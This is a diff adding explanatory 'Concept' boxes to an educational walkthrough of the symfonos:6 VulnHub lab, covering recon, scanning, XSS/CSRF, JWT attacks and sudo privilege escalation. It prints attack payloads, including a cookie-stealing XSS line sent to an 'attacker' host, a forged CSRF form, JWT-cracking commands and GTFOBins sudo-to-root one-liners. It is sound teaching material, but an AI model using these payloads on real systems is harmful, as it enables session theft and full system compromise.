@@ -21,6 +21,23 @@ and **sudo misconfiguration**. It is also the last entry in the symfonos series.
 
 ---
 
+> ### 📖 How to read this walkthrough
+>
+> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
+> do — not just the command, but what it is and why it works. They are the point of
+> this document; the commands are only the demonstration.
+>
+> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
+> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
+> escalation). Read the box here for the idea, follow the link when you want the full
+> treatment.
+>
+> **Brand new to this?** Start with
+> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
+> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).
+
+---
+
 ## 0. What you will learn
 
 - How to find a host on a host-only network and enumerate its services.
@@ -54,6 +71,30 @@ ip a
 Now discover other hosts on that subnet. `netdiscover` sends ARP requests and listens for
 replies, which is perfect on a host-only network where DHCP is in use.
 
+
+> ### 📖 Concept — What is reconnaissance?
+>
+> **Reconnaissance** ("recon") is the phase where you work out *what exists*
+> before you try to break into anything. It is deliberately broad and shallow: you
+> are drawing a map, not attacking a position. The term comes straight from the
+> military — send scouts to look at the terrain before committing troops.
+>
+> On a lab box, recon almost always means one thing: **find the target's IP.** The
+> tools above do it with **ARP** — the layer-2 protocol that answers *"which
+> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
+> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
+> machine that refuses to answer `ping` will still answer ARP.
+>
+> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
+> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
+> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
+> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
+> against your hypervisor's settings** — attacking the wrong host is the classic
+> beginner error.
+>
+> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
+> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)
+
 ```bash
 sudo netdiscover -r 192.168.56.0/24
 ```
@@ -79,11 +120,70 @@ export ip=192.168.56.101
 
 ---
 
+
+> ### 📖 Concept — What is enumeration, and how is it different from scanning?
+>
+> **Enumeration** is interrogating the services you found to extract *specific,
+> actionable detail*: usernames, directory paths, share names, versions, database
+> tables.
+>
+> | | **Scanning** | **Enumeration** |
+> | --- | --- | --- |
+> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
+> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
+> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
+>
+> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
+> a login without a username. You cannot crack a hash you never found. You cannot
+> exploit an upload path you do not know. Every successful foothold traces back to an
+> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
+> KEY" in capitals. They are telling you which phase you are skipping.
+>
+> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)
+
 ## 2. Enumeration
 
 ### 2.1 Port scan
 
 Run a full TCP scan with service and default-script detection.
+
+
+> ### 📖 Concept — What is nmap, and how does a port scan work?
+>
+> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
+> magic: it **sends deliberately crafted packets and classifies the responses**.
+> Understand that and every flag becomes predictable.
+>
+> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
+> address gets you to the machine, the port gets you to the service. TCP is
+> connection-oriented, so a scan is really a conversation — the **three-way
+> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
+> replies, and they map directly onto the words in the output:
+>
+> | Target's reply | nmap reports | Meaning |
+> | --- | --- | --- |
+> | **SYN-ACK** | `open` | A program is listening |
+> | **RST** | `closed` | Host up, nothing listening there |
+> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
+>
+> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
+> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
+> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
+> Add `--reason` to any scan to see this evidence column explicitly; it is the best
+> learning flag in nmap.
+>
+> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
+> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
+> fingerprints versions by reading banners and probing against ~10,000 known
+> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
+> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
+> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
+> enables the faster stealthier SYN scan instead of a full connect.
+>
+> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
+> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
+>
+> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)
 
 ```bash
 sudo nmap -sC -sV -p- -oN nmap-full.txt $ip
@@ -114,6 +214,44 @@ Ports of interest, and what they usually mean:
 ### 2.2 Web directory discovery
 
 Port 80 shows a simple page. Let's find hidden directories.
+
+
+> ### 📖 Concept — What is content discovery, and what is a wordlist?
+>
+> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
+> There is no cleverness — it is a dictionary attack against the URL space. A web
+> server will serve anything it has but does not advertise an index, so the tool
+> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
+> response.
+>
+> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
+> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
+> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
+> words beats a random generator of millions. Common sources on Kali:
+>
+> | List | Size | Notes |
+> | --- | --- | --- |
+> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
+> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
+> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
+> | **SecLists** | huge | The professional standard — `apt install seclists` |
+>
+> **The status codes are the whole result:** `200` exists and is readable · `201`
+> means a `PUT` succeeded, **you can write files here** · `301` is usually a
+> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
+> it — itself an information leak · `404` is the baseline · `500` means **your input
+> broke something**, often injection.
+>
+> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
+> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
+>
+> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
+> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
+> empty, change the extension list before you change the wordlist.** Try
+> `php,txt,html,bak,old,zip,conf,log,inc`.
+>
+> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
+> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
 
 ```bash
 gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt
@@ -184,6 +322,52 @@ make a *new admin account that we control*.
 1. Register a normal account on FlySpray, for example `user1` / `user1`.
 2. Copy the exploit script (shown in EDB 41918) into a file called `script.js`. It grabs
    the current CSRF token and posts a form to create a new user.
+
+
+> ### 📖 Concept — XSS and CSRF: two attacks that sound alike and are not
+>
+> **XSS** (Cross-Site Scripting) injects JavaScript that runs **in another user's
+> browser**, with their session and their privileges. Three flavours:
+>
+> | Type | Where the payload lives | Danger |
+> | --- | --- | --- |
+> | **Reflected** | In the URL, echoed straight back | Victim must click your link |
+> | **Stored** | Saved server-side (a comment, a profile field) | Runs for **every** visitor — much worse |
+> | **DOM-based** | Never reaches the server; client-side JS inserts it unsafely | Invisible to server logs |
+>
+> ```html
+> <script>alert(document.domain)</script>
+> <script>fetch('http://attacker/?c='+document.cookie)</script>
+> "><img src=x onerror=alert(1)>      <!-- breaks out of an HTML attribute -->
+> javascript:alert(1)                 <!-- inside an href -->
+> ```
+>
+> **Why XSS is equivalent to account takeover:** stealing an administrator's session
+> cookie needs no password. And on a CMS, an admin account is remote code execution,
+> because admins can edit theme and template files.
+>
+> **CSRF** (Cross-Site Request Forgery) is different: it makes a *logged-in* user
+> perform an action they did not intend, by exploiting the fact that the browser
+> attaches session cookies automatically.
+>
+> ```html
+> <form method="post" action="http://target/wp-admin/admin-ajax.php">
+>   <input type="hidden" name="username" value="admin">
+>   <input type="hidden" name="action"   value="loginGuestFacebook">
+>   <input type="submit" value="Login">
+> </form>
+> ```
+>
+> **The defence is a nonce** — a per-session, unpredictable token bound to the form,
+> which an attacker's page cannot know. Its absence is the vulnerability.
+>
+> > CSRF can be far worse than "trick a user into clicking." In WP Support Plus 7.1.3
+> > (Exploit-DB **41006**) the vulnerable action called WordPress's
+> > `wp_set_auth_cookie()` on a username taken straight from the POST body **with no
+> > password check at all** — so an *anonymous* attacker could log in as any user.
+>
+> **Deep dive:** [CONCEPTS §13.6 — XSS](../../docs/CONCEPTS.md#136-cross-site-scripting-xss) ·
+> [§13.7 — CSRF](../../docs/CONCEPTS.md#137-csrf)
 
 ```bash
 cat > script.js <<'EOF'
@@ -287,6 +471,43 @@ curl -s -H "Content-Type: application/json" -X POST \
   -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}'
 ```
 
+
+> ### 📖 Concept — JSON Web Tokens, and how they get attacked
+>
+> A **JWT** is three base64**url**-encoded sections joined by dots:
+> **`header.payload.signature`**. Anything starting `eyJ` is almost certainly a JWT —
+> `eyJ` is the base64url encoding of `{"`, the start of a JSON object.
+>
+> ```bash
+> echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d 2>/dev/null; echo
+> # {"alg":"HS256"}
+> ```
+>
+> The **payload is only encoded, not encrypted** — read it freely. What the signature
+> protects is *integrity*: the server signs header+payload with a secret so you cannot
+> edit them.
+>
+> **The classic attacks:**
+>
+> | Attack | How |
+> | --- | --- |
+> | **`alg: none`** | Set the header algorithm to `none` and **delete the signature**. Unsigned-verification bugs accept it. |
+> | **Weak HMAC secret** | The signature is `HMAC-SHA256(header.payload, secret)`. If the secret is a common word, crack it offline and forge any token. |
+> | **Algorithm confusion (RS→HS)** | If the server expects RSA, switch to `HS256` and sign with the *public* key as the HMAC secret — the server verifies with the same bytes. |
+> | **`kid` injection** | A key-ID pointing at a predictable path (`/dev/null`, `../../file`) makes the server "verify" with attacker-known bytes. |
+> | **Claim tampering** | Change `"role":"user"` → `"admin"`, or `"sub"` to another user, then re-sign. |
+>
+> ```bash
+> hashcat -m 16500 -a 0 token.txt rockyou.txt     # crack an HS256 JWT secret
+> # or use jwt_tool to automate every attack above:
+> python3 jwt_tool.py <token> -M at                 # "all tests"
+> ```
+>
+> `-m 16500` is hashcat's mode for a JWT. A cracked secret means you can mint tokens
+> for **any** user, including the administrator.
+>
+> **Deep dive:** [CONCEPTS §13.10 — Authentication bypass checklist](../../docs/CONCEPTS.md#1310-authentication-bypass-checklist)
+
 ```text
 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6...","user":{"username":"achilles","id":1}}
 ```
@@ -321,6 +542,45 @@ Start a listener and request a reverse shell instead of `id` to get an interacti
 
 ---
 
+
+> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
+>
+> You have a shell as a low-privileged user — often `www-data`, the account Apache
+> runs as, which has no usable password and no home directory. **Privilege
+> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
+>
+> Why bother? An ordinary user can read their own files and almost nothing else. Root
+> reads every file, loads kernel modules, changes any password, and installs a
+> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
+> a real engagement root is the difference between "we found a weak password" and "the
+> entire estate is compromised."
+>
+> **The discipline is a checklist, worked from cheapest to most destructive:**
+>
+> | Order | Check | Command |
+> | --- | --- | --- |
+> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
+> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
+> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
+> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
+> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
+> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
+> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
+> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
+>
+> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
+> can panic the VM and cost you a re-import, so it is a last resort, not a first
+> instinct.
+>
+> **Also orient yourself first** — it is one line and it tells you which OS you are
+> on, which decides everything else:
+>
+> ```bash
+> id; whoami; hostname; uname -a; cat /etc/os-release
+> ```
+>
+> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)
+
 ## 4. Privilege escalation
 
 ### 4.1 Horizontal: become achilles
@@ -341,6 +601,51 @@ uid=1000(achilles) gid=1000(achilles) groups=1000(achilles)
 ### 4.2 Vertical: achilles in the sudoers file
 
 Check what `achilles` may run as root:
+
+
+> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
+>
+> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
+> exists so administrators can grant *specific* elevated abilities without handing out
+> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
+>
+> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
+> run as any new user on any box** — it costs nothing, and a surprising fraction of
+> machines are solved by one line of its output.
+>
+> **Parse the tokens precisely:**
+>
+> | Token | Meaning |
+> | --- | --- |
+> | `(ALL)` | may run as **any** user, including root |
+> | `(root)` | only as root |
+> | `(ALL:ALL)` | any user **and** any group |
+> | `(user)` | only as that specific user — try `sudo -u user …` |
+> | **`NOPASSWD:`** | **no password will be requested** |
+> | `/usr/bin/foo` | only this binary, at this **absolute path** |
+> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
+> | `/usr/bin/foo -m *` | only with these arguments |
+> | `ALL` alone | full root, no restriction |
+>
+> **The rule that matters:** *any program that can execute another program, granted
+> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
+> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
+> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
+>
+> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
+> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
+> scheduler, organised by capability (shell, file read, file write, reverse shell).
+> It is maintained, tested, and explains *why* each line works. The Windows equivalent
+> is **LOLBAS**.
+>
+> ```bash
+> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
+> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
+> sudo vim -c ':!sh'                            # GTFOBins: vim
+> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
+> ```
+>
+> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
 
 ```bash
 sudo -l
@@ -432,6 +737,8 @@ Congrats on rooting symfonos:6!
 ---
 
 ## 7. References
+
+- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)
 
 - VulnHub entry — symfonos: 6.1: https://vulnhub.com/entry/symfonos-61,458/
 - Exploit-DB 41918 — FlySpray 1.0-rc4 XSS/CSRF: https://www.exploit-db.com/exploits/41918
